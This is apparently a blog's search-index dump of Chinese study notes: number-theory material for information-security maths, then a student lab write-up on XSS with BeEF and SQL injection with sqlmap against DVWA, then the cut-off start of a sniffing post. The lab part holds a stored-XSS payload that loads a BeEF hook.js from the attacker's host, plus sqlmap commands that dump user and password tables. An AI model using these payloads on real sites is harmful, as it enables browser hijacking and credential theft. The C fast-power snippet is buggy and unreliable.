应用：当p为素数的时候，费马小定理可以快速的求出a (mod p) ¶Wilson定理 设p是一个素数，则 (p−1)!≡−1(mod p)(p-1)! \\equiv -1(mod \\ p) (p−1)!≡−1(mod p) 看到数字连乘的时候可以考虑使用Wilson定理 ¶模重复平方法 用于求大数平方的模 12345678910111213141516&quot;&quot;&quot;模重复平方法&quot;&quot;&quot;# 求解一个数的n次方的模# 比如12996的227次方模37909同余的结果a = 1num = 12996n = 227c = 37909while n: if n % 2 == 1: a = a * num % c num = (num ** 2) % c n //= 2print(a) 重要知识点： ¶判断两个数是否同余？ 根据定理：m｜(a-b) ,则a≡(mod m)a \\equiv (mod \\ m)a≡(mod m) a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)的充要条件是：a=b+q⋅ma=b+q \\cdot ma=b+q⋅m a,b对于m除的余数相同； ¶判断一个数n能否被3，7，9，11，13整除 =&gt; P57 （1）对于3和9 将n转化为10进制的科学记数法，n=ak⋅10k+...+a0n=a_k \\cdot 10^k + ... + a_0n=ak​⋅10k+...+a0​ （i）3｜n的充分必要条件是`》3 ｜ aia_iai​ （ii）9｜n的充分必要条件是=〉 9｜aia_iai​ （2）如何便捷的判断大数能否被11、13、7整除？ 7可以整除n的充分必要条件就是7可以整除整数: (a0+a2+⋅⋅⋅)−(a1+a3+⋅⋅⋅)(a_0+a_2+ \\cdot \\cdot \\cdot)-(a_1 + a_3 + \\cdot \\cdot \\cdot) (a0​+a2​+⋅⋅⋅)−(a1​+a3​+⋅⋅⋅) a0−ana_0 - a_na0​−an​就是数字n各位上的数字； ¶如何求模m的完全剩余系？ ==&gt; P64 （1）直接取得0，…，m-1即是一个完全剩余系 （2）对于从0到m-1的这个完全剩余系，可以对于某部分数再加上m的倍数; （3）如果已知一个完全剩余系kik_iki​,对于（a，m）=1，b是任意整数，a⋅ki+ba \\cdot k_i +ba⋅ki​+b也是一个完全剩余系 （4）如果m1⋅m2=mm_1 \\cdot m_2 = mm1​⋅m2​=m,且(m1,m2)=1(m_1,m_2)=1(m1​,m2​)=1,而k1k_1k1​ ，k2k_2k2​遍历m1,m2m_1,m_2m1​,m2​的完全剩余系，那么m2⋅k1+m1⋅k2m_2 \\cdot k_1 + m_1 \\cdot k_2m2​⋅k1​+m1​⋅k2​则遍历模m的完全剩余系； ¶如何求一个数的欧拉函数？ ==&gt; P70 (1)设m，n是互素的两个正整数，则 ϕ(m⋅n)=ϕ(m)⋅ϕ(n)\\phi(m \\cdot n)=\\phi(m) \\cdot \\phi(n)ϕ(m⋅n)=ϕ(m)⋅ϕ(n) 而且这个公式可以无限套娃，也就是说ϕ(m)和ϕ(n)\\phi(m)和\\phi(n)ϕ(m)和ϕ(n)还可以继续往下分； (2)对于任意的整数m： ϕ(m)=m⋅(1−1p1)(1−1p2)⋅⋅⋅\\phi(m)=m \\cdot (1-\\frac{1}{p_1})(1-\\frac{1}{p_2}) \\cdot \\cdot \\cdot ϕ(m)=m⋅(1−p1​1​)(1−p2​1​)⋅⋅⋅ p的来源是标准分解式 ==&gt; P70 ¶如何求模m的简化剩余系 ==&gt; P70 (1) 按照定义来，在最小非负完全剩余系中暴力判断每一个代表元是否与m互素，是的话保存；最后剩的就是一个最为简单的简化剩余系 (2) 同求完全剩余的第（3），如若已知kik_iki​，若存在一个a满足（a,m）=1，那么a⋅kia \\cdot k_ia⋅ki​也遍历模m的一个简化剩余系 (3) 同求完全剩余的第（4），如果m1⋅m2=mm_1 \\cdot m_2 = mm1​⋅m2​=m且(m1,m2)=1(m_1,m_2)=1(m1​,m2​)=1而k1,k2k_1,k_2k1​,k2​遍历m1,m2m_1,m_2m1​,m2​的简化剩余系，那么m2⋅k1+m1⋅k2m_2 \\cdot k_1 +m_1 \\cdot k_2m2​⋅k1​+m1​⋅k2​则遍历模m的简化剩余系； (4) 如若a是模m的原根，则m的简化剩余系就是a0,a1,...,aϕ(m)−1a^0,a^1,...,a^{\\phi(m)-1}a0,a1,...,aϕ(m)−1 ==&gt; P169 ¶如何快速计算bnb^nbn ==&gt; P80 采用模重复平凡计算法（也叫快速幂 ACM经典算法）： 对于bnb^nbn来说，如果按照正常的算法，那么需要运算n次，如果按照本算法，就只需要log2nlog_2nlog2​n次，时间复杂度大大减少； C实现： 123456789int fastpow(int base,int n,int mod)&#123; int ans=1; while(n)&#123; if(n&amp;1) ans*=base%mod; base*=base; n&gt;&gt;=1; &#125; return ans%mod;&#125; ¶如何求解一个数的逆元？ 枚举法：对于比较小的数可以通过肉眼 “看” 的方式直接口算出他的逆元 费马小定理：如果m为素数则逆元可以表达为：am−2 mod ma^{m-2} \\ mod \\ mam−2 mod m 拓展欧几里得算法： x是a的逆元可以表示为：ax=1(mod n)ax=1(mod \\ n)ax=1(mod n) ； 然后可以得到：ax−ny=1ax-ny = 1ax−ny=1; 之后运用拓展欧几里得算法求得：ax+ny=1ax+ny=1ax+ny=1的解即可 注意逆元存在的条件为（a，n）= 1","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【信息安全数学导论】整除","slug":"【信息安全数学导论】整除","date":"2020-12-03T18:03:25.000Z","updated":"2020-12-23T14:13:08.349Z","comments":true,"path":"2020/12/04/【信息安全数学导论】整除/","link":"","permalink":"http://example.com/2020/12/04/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%AF%BC%E8%AE%BA%E3%80%91%E6%95%B4%E9%99%A4/","excerpt":"整除的可能性 我也不知道应该怎么整理这个笔记，先整理着试一试吧 ¶整除的一些概念 b整除a记作 b∣ab|ab∣a，不能整除记作b∤ab\\nmid ab∤a 当b遍历整数a的所有因子时，-b和ab\\frac{a}{b}ba​也遍历a的所有因数 特殊数字的整除： 0是任何非零整数的倍数 1是任何整数的因数 任何非零整数a数其自身的倍数，也是其自身的因数 整除具有传递性：","text":"整除的可能性 我也不知道应该怎么整理这个笔记，先整理着试一试吧 ¶整除的一些概念 b整除a记作 b∣ab|ab∣a，不能整除记作b∤ab\\nmid ab∤a 当b遍历整数a的所有因子时，-b和ab\\frac{a}{b}ba​也遍历a的所有因数 特殊数字的整除： 0是任何非零整数的倍数 1是任何整数的因数 任何非零整数a数其自身的倍数，也是其自身的因数 整除具有传递性： 若 b∣a，c∣bb\\mid a ，c\\mid bb∣a，c∣b 则 c∣ac \\mid ac∣a 整除的性质在加法和减法运算以及线性组合中都是可以保持 若 c∣a,c∣bc | a,c|bc∣a,c∣b 则 c｜a+bc｜a+bc｜a+b ，减法也是一样，线性组合中也是一样s⋅a+t⋅bs \\cdot a + t \\cdot bs⋅a+t⋅b 被 c 整除 这个整数也可以被推广到多个整数的线性组合 如果两个数互相整除，那么这两个数不是相等就是互为相反数 素数 总是正整数 从了1和自身没有一个数再能整除它了 如何快速的找到素数？==》 平凡除法 / 厄拉托赛师（Eratosthenes）算法 素数有无穷多个 欧几里得除法——最小非负余数 设a,b是两个整数，其中b&gt;0，则存在唯一的整数q和r使得a=q⋅b+r,0&lt;r&lt;ba = q \\cdot b + r, 0 &lt; r &lt; ba=q⋅b+r,0&lt;r&lt;b，q叫做a被b除所得的不完全商 最大公因子与广义欧几里德除法 最大公因数：因数中最大的一个，a和b的最大公因数记作（a，b） 一堆不全为0的数的公因数与这堆数加上绝对值后的公因数相同 Bezout等式的计算 ==》太难说明了，结合矩阵图理解吧 广义欧几里得算法：简单的来说就是当两个数比较大的时候来求这两个数的最大公因子，时间复杂度为O(n) 123456789101112131415161718192021222324252627282930313233343536373839404142434445&quot;&quot;&quot;贝祖公式的实现&quot;&quot;&quot;import mathj = []s_j = []t_j = []q_j_1 = []r_j_1 = []# 规定a和ba = 3589b = 1613temp_a = atemp_b = b# 先求r_j_1和q_j_1r_j_1.append(temp_a)r_j_1.append(temp_b)while temp_a % temp_b != 0: # 向下取整 q = math.floor(temp_a / temp_b) q_j_1.append(q) r_j_1.append(temp_a - temp_b * q) temp = temp_b temp_b = temp_a - temp_b * q temp_a = temp# r_j_1.append(0)# q_j_1.append(math.floor(a / b))# 求s_j 和 t_j q12# 初始化s_j 和 t_js_j.append(1)t_j.append(0)s_j.append(0)t_j.append(1)for i in range(len(q_j_1)): s_j.append(-q_j_1[i] * s_j[i + 1] + s_j[i]) t_j.append(-q_j_1[i] * t_j[i + 1] + t_j[i])print(r_j_1)print(q_j_1)print(s_j)print(t_j)print(s_j[-1] * a + t_j[-1] * b) 最大公因子进一步的性质 如何找到两个较小的互素的整数，或者说如何构造互素的整数 (a(a⋅b),b(a,b))=1(\\frac{a}{(a \\cdot b)},\\frac{b}{(a,b)}) = 1 ((a⋅b)a​,(a,b)b​)=1 m为任意个正整数，则m⋅a,m⋅b=m⋅(a⋅b)m \\cdot a,m \\cdot b = m \\cdot (a \\cdot b)m⋅a,m⋅b=m⋅(a⋅b) 若非零整数d满足，d｜a且d｜b，则 (ad,bd)=(a,b)∣d∣(\\frac{a}{d},\\frac{b}{d}) = \\frac{(a,b)}{|d|} (da​,db​)=∣d∣(a,b)​ 设a，b，c是三个整数，且b≠0,c≠0b \\neq 0,c \\neq 0b​=0,c​=0 如果 （a，c）= 1 则 (ab,c)=(b,c)(ab,c) = (b,c) (ab,c)=(b,c) 如果c和一组数中的每一个数都互素，则它和这一组数的乘积也互素 设a，b，u，v都是不全为0的整数，如果 a=q⋅u+r⋅v,b=s⋅+t⋅v,a = q \\cdot u + r \\cdot v,b=s \\cdot + t \\cdot v, a=q⋅u+r⋅v,b=s⋅+t⋅v, 其中q, r , s, t是整数，且q⋅t−r⋅s=1q \\cdot t - r \\cdot s = 1q⋅t−r⋅s=1，则(a,b) = (u,v) 如果计算多个数的最大公因数？ == 》 两个两个算即可 2α−12^\\alpha-12α−1的整数及其最大公因数 设a和b是两个正整数，则2a−1和2b−1除的最小非负余数是2r−1,其中r是a被b除的最小非负余数2^a-1和2^b-1除的最小非负余数是2^r-1,其中r是a被b除的最小非负余数2a−1和2b−1除的最小非负余数是2r−1,其中r是a被b除的最小非负余数 2a−1和2b−1的最大公因数是2(a,b)−12^a-1和2^b-1的最大公因数是2^{(a,b)}-12a−1和2b−1的最大公因数是2(a,b)−1 整除的进一步性质 如果 c ｜ ab，（a，c）=1，则c｜b。其实很好理解因为a和c的最大公因子为1了，就可以推出来c一定是可以整出b的。 如果 p ｜ab 则 p｜a 或 p｜b ，这个也是比较明显的 最小公倍数 a和b的最小公倍数记作 [a,b][a,b][a,b] 若a｜D，b｜D，则[a,b] | D; 最小公倍数的一种计算方法（最小公倍数与最大公因数的关系）：[a,b]=a⋅b(ab˙)[a,b] = \\frac{a \\cdot b}{(a \\dot b)}[a,b]=(ab˙)a⋅b​ 如何计算多个最小公倍数？==》 两个两个计算 整数分解 整数分解定理 重要知识点 ¶如何证明一个数是素数： 用Eratosthenes筛法（平凡判别P7） 具体：对于一个数n，所有p&lt;n1/2p&lt; n^{1/2}p&lt;n1/2，均无法整除n，则n是一个素数 其欧拉函数即 φ(m)=m−1φ(m)=m−1φ(m)=m−1的时候，m是一个素数 P68 对于模m的最小正数完全剩余系等于其最小正数简化剩余系的时候，m是一个素数 利用Wilson定理，如果一个整数n，(n−1)!+1≡0(mod n)(n-1)!+1 \\equiv 0 (mod \\ n)(n−1)!+1≡0(mod n)时，n是一个素数 P118 ¶N的B进制的表示： P9 N=Ak−1Bk−1+......+A1B+A0N = A_{k-1}B_{k-1}+......+A_1B+A_0N=Ak−1​Bk−1​+......+A1​B+A0​ ¶如何确定一个整数d是an......a0a_n ...... a_0an​......a0​的最大公因数： P20 （1）d∣an,d∣an−1...,d∣a0d|a_n,d|a_{n-1}...,d|a_0d∣an​,d∣an−1​...,d∣a0​ == &gt; d可以整除所有的aia_iai​ （2）对于一个数e，若e∣an...e∣a0e|a_n ... e|a_0e∣an​...e∣a0​则e|d; ¶如何计算两个数的最大公因数？ ¶1.广义欧几里得除法： P22 利用（a，b）=（b，c），一步一步的缩小 ¶2.贝祖公式 P25 🌿 贝祖等式：sa+tb=（a，b） 证明在 P27 如何求s和t？ 上面已经给出了Python代码的实现； ¶3. 如果形式为(2a−1,2b−1)(2^a-1,2^b-1)(2a−1,2b−1) 其最大公因数为2(a,b)−12^{(a,b)}-12(a,b)−1 ,P37 ¶4. 如果知道最小公倍数 P39 (a,b)=a⋅b[a,b](a,b)=\\frac{a \\cdot b}{[a,b]} (a,b)=[a,b]a⋅b​ ¶如何确定一个整数D是a1...ana_1 ... a_na1​...an​的最小公倍数？ P39 （1）ai∣Da_i | Dai​∣D （2）若ai∣D′a_i|D&#x27;ai​∣D′,则D｜D’ ¶如何构造两个互素的数？ 利用基础性质 (a(a.b),ba.b)=1(\\frac{a}{(a.b)},\\frac{b}{a.b})=1 ((a.b)a​,a.bb​)=1 构造一个ad-bc=1 则(a , b) = 1 通过一个已知的（u，v）= 1构造出（a，b）= 1 P35 (ab)=(qrst)(uv)\\begin{gathered} \\begin{pmatrix} a \\\\ b \\end{pmatrix} = \\begin{pmatrix} q &amp; r \\\\ s &amp; t \\end{pmatrix}\\begin{pmatrix} u \\\\ v \\end{pmatrix} \\end{gathered} (ab​)=(qs​rt​)(uv​)​ qt - sr = 1，可以得到，a = qu + rv；b = su + tv； 对于已知的（a，b）= 1，(2a−1,2b−1)=1(2^a - 1,2^b - 1)=1(2a−1,2b−1)=1 ==&gt; P37","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【白帽子学习笔记】XSS和SQL注入","slug":"【白帽子学习笔记】XSS和SQL注入","date":"2020-11-17T09:10:23.000Z","updated":"2020-12-19T05:23:15.146Z","comments":true,"path":"2020/11/17/【白帽子学习笔记】XSS和SQL注入/","link":"","permalink":"http://example.com/2020/11/17/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"【白帽子学习笔记】XSS和SQL注入 yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮ @[toc] ¶0x01 实验知识点 ¶1x01 什么是XSS？ XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 ¶1x02 什么是Cookie？ Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。","text":"【白帽子学习笔记】XSS和SQL注入 yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮ @[toc] ¶0x01 实验知识点 ¶1x01 什么是XSS？ XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 ¶1x02 什么是Cookie？ Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。 ¶1x03 XSS漏洞的分类 存储型 XSS：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。 如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个定时炸弹放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。 存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。 DOM-Based XSS漏洞： DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。 由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。 **反射型XSS：**仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。 关于反射型的XSS漏洞，我之前的博客也有进行整理，链接如下 【白帽子学习笔记13】DVWA 反射型XSS（跨站点脚本攻击） ¶1x04 SQL注入攻击 所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 为什么会有SQL注入攻击？ 很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。 因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。 关于SQL注入的常用语法我也有进行整理，链接如下： 【白帽子学习笔记14】SQL注入常用语句 【白帽子学习笔记15】XVWA SQL Injection ¶0x02 XSS部分：Beef ¶1x01 搭建GuestBook网站 本次实验中我在Win Server 2003中搭建了Guestbook环境（IIS），搭建过程中需要注意以下几点 在搭建IIS配置完成后注意将网站所在的文件夹权限打开，将Everyone用户组给到改文件夹的完全控制权限。 如果使用Windows Server可能需要手动配置一下IP和网关使其与其他虚拟机处于同一网段。 本次实验中虚拟机网络模式：Net模式 ¶1x02 AWVS扫描 首先我们使用AWVS扫描刚才搭建的网站 接下来一路继续就行，可能需要添加一个密码。然后就可以正常进行扫描了，扫描结果如下： 发现在error.asp和add.asp分别都有一个XSS漏洞。 ¶1x03 Kail中使用Beef生成恶意代码 现在Kail-2020中应该是没有自带Beef了，我们需要自己安装一下 sudo apt-get install beef-xss 然后cd进入到这个文件夹中： cd /usr/share/beef-xss 输入： ./beef即可启动 第一次的时候可能会提醒你不要使用默认的账号和密码，就像下面这样： 我们进入到提示的文件夹中进行一下修改 用vim打开一下：sudo vim /etc/beef-xss/config.yaml 不会使用vim的建议百度搜索一下用法，linux下经常会用到。 我把账号和密码都修改为了beeff，之后保存退出。再输入 ./beef 使用默认用户可能会导致你安装失败 输入su然后输入root密码，切换为root权限，然后再输入./beef 会提示你现在已经启动了，然后打开kali中自带的firefox浏览器。进入到： http://127.0.0.1:3000/ui/authentication 输入你刚才设置的账号和密码，就可以成功的登陆了。 访问一下hook.js里面有自带的恶意代码 只要访问到这个网站，对方的浏览器就会被劫持。 ¶1x04 XSS注入漏洞 ¶2x01 XSS劫持网站 现在使用自己的本机访问留言簿的网站，并将XSS注入恶意代码。 XSS注入代码如下： &lt;script src=&quot;http://Kali的IP地址:3000/hook.js&quot;&gt;&lt;/script&gt; 现在进入到这个当中我们可以发现已经成功了，而且看不到刚才写的代码，说明代码已经被成功的加载进去了！ 刷新一下界面，可以发现会有一个弹框： 然后再回到kali里面的beef管理界面看一下，可以发现10.34.80.1也就是我的本机已经被劫持了！ 可以使用他干一些奇怪的事情，还有查询一些信息 ¶2x02 劫持浏览器指定被劫持网站为学校主页 在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。 本次实验中的XSS攻击属于注入型XSS攻击。 ¶0x02 SQL注入（DVWA+SQLMAP+Mysql） ¶1x01 实验环境搭建 打开Metasploitable2后，里面有搭建好的DVWA，访问http://Metasploitable的IP/dvwa即可 在low级别的SQL Injection中进行SQL注入的尝试： 输入1，可以正常显示： 输入1’ 报错 可以判断此处有报错： 下面使用sqlmap进行攻击 SQLMAP基本语法： -u:指定目标URL –cookie：当前会话的cookies值 -b：获取数据库类型，检查数据库管理系统标识 –current-db：获取当前数据库 –current-user：获取当前数据库使用的用户 -string：当查询可用来匹配页面中的字符串 -users：枚举DBMS用户 -password：枚举DBMS用户密码hash ¶1x02 枚举当前数据库名称和用户名 查询一下当前的数据库： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-db -u后是需要攻击的url 因为dvwa是需要登陆的，需要cookie用作身份验证，可以通过浏览器F12抓包获取 –current-db表示查询当前数据库 然后查询一下当前的使用者： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; --current-user ¶1x03 枚举数据库用户名和密码 枚举数据库的表名： 因为我们是dvwa所以爆破dvwa数据库中的数据表 sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa --tables 枚举数据表中的列名： 根据上面的枚举结果，我们应该是要看users数据表中的内容： sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users --columns 枚举数据表中的用户和密码： 查询到users数据表中有那么多的字段，我们想要的数据应该就在user和password中了 sqlmap -u &quot;http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979&quot; -D dvwa -T users -C user,password --dump 这里会询问你是否使用Kali中自带的字典进行攻击，选择是就好了 最后得到结果： ¶0x03 实验小结 在本次的实验中学习了两种最常见的漏洞：XSS漏洞和SQL注入漏洞，在实验过程中具体的掌握了如下知识点： 如何使用扫描器AWVS 如何向网站中注入XSS漏洞 如何使用Beef利用网站中的XSS漏洞 如何使用SQLMAP利用网站的注入漏洞","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【白帽子学习笔记】网络嗅探与身份验证","slug":"【白帽子学习笔记】网络嗅探与身份验证","date":"2020-11-04T23:20:59.000Z","updated":"2020-12-19T05:04:03.091Z","comments":true,"path":"2020/11/05/【白帽子学习笔记】网络嗅探与身份验证/","link":"","permalink":"http://example.com/2020/11/05/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/","excerpt":"@一个在写实验报告的人，/(ㄒoㄒ)/~~ 0x01 网络嗅探相关概念 ¶1x01 网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧： 帧的目标区域具有和本地网络接口相匹配的硬件地址； 帧的目标区域具有“广播地址”。","text":"@一个在写实验报告的人，/(ㄒoㄒ)/~~ 0x01 网络嗅探相关概念 ¶1x01 网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧： 帧的目标区域具有和本地网络接口相匹配的硬件地址； 帧的目标区域具有“广播地址”。 如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的&quot;打开失效&quot;模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。 ¶1x02 ARP欺骗 